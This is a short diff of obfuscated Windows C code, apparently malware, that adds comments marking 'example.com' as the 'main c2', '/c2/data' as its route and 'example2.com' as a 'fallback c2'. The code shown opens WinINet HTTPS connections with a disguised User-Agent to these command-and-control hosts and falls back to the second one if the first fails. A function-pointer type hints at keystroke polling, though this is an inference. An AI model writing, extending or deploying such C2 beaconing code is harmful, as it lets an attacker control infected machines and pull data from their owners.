@@ -18,8 +18,8 @@
 char V1[O1];
 int V2 = 0;
 CRITICAL_SECTION V3;
-char* O3 = "example.com";
-char* O5 = "/c2/data";
+char* O3 = "example.com"; //main c2
+char* O5 = "/c2/data"; // route 
 char* O6 = "Content-Type: application/json\r\nUser-Agent: TLD11Browser/10.0";
 
 typedef SHORT (WINAPI *F3)(int);
@@ -116,7 +116,7 @@ void F10() {
     if (V20) {
         HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (!V21) {
-            V21 = InternetConnectA(V20, "example2.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+            V21 = InternetConnectA(V20, "example2.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); // fallback c2
             if (!V21) {
                 InternetCloseHandle(V20);
                 return;
